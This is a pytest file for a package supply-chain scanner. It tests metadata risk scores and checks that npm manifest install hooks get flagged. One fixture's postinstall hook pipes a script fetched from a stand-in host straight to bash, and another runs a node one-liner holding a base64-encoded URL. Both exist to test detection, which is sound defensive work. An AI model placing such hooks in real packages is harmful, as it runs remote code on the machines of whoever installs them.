import json
from pathlib import Path

from supplyguard.metadata.risk_scorer import compute_metadata_risk
from supplyguard.scanner.manifest_scanner import (
    merge_manifest_rules,
    scan_manifest,
)
from supplyguard.scanner.rules_engine import RulesResult


def _write_package(tmp_path: Path, package_json: dict, files: dict[str, str] | None = None) -> Path:
    # Keep fixture packages tiny so each test documents exactly one signal.
    (tmp_path / "package.json").write_text(json.dumps(package_json), encoding="utf-8")
    for rel_path, body in (files or {}).items():
        target = tmp_path / rel_path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(body, encoding="utf-8")
    return tmp_path


def test_metadata_risk_is_low_for_complete_plain_package():
    pkg_json = {
        "name": "plain-tools",
        "version": "1.0.0",
        "description": "Small collection of ordinary helper functions.",
        "license": "MIT",
        "repository": {"type": "git", "url": "https://example.invalid/repo.git"},
        "dependencies": {"left-pad": "^1.3.0"},
    }

    assert compute_metadata_risk("plain-tools", pkg_json) == 0.0


def test_metadata_risk_increases_for_sparse_install_hook_package():
    pkg_json = {
        "name": "lodasj",
        "version": "1.0.0",
        "scripts": {"postinstall": "node install.js"},
    }

    risk = compute_metadata_risk("lodasj", pkg_json)

    assert risk >= 0.4
    assert risk <= 1.0


def test_manifest_scanner_flags_curl_pipe_install_hook(tmp_path):
    package_dir = _write_package(
        tmp_path,
        {
            "name": "install-fetcher",
            "version": "1.0.0",
            "scripts": {"postinstall": "curl https://bad.example/p.sh | bash"},
        },
    )

    rules = scan_manifest(str(package_dir))
    rule_ids = {rule["rule_id"] for rule in rules}

    assert "CRIT_MANIFEST_CURL_PIPE" in rule_ids
    assert "HIGH_MANIFEST_SUSPICIOUS_URL" in rule_ids


def test_manifest_merge_preserves_existing_rules(tmp_path):
    package_dir = _write_package(
        tmp_path,
        {
            "name": "encoded-runner",
            "version": "1.0.0",
            "scripts": {
                "postinstall": (
                    "node -e \"Buffer.from('aHR0cHM6Ly9iYWQuZXhhbXBsZQ==','base64')\""
                )
            },
        },
    )
    result = RulesResult(total_score=2.0)

    merged = merge_manifest_rules(result, str(package_dir))

    assert merged is result
    assert merged.total_score > 2.0
    assert any(rule.rule_id == "CRIT_MANIFEST_NODE_EVAL" for rule in merged.matched_rules)
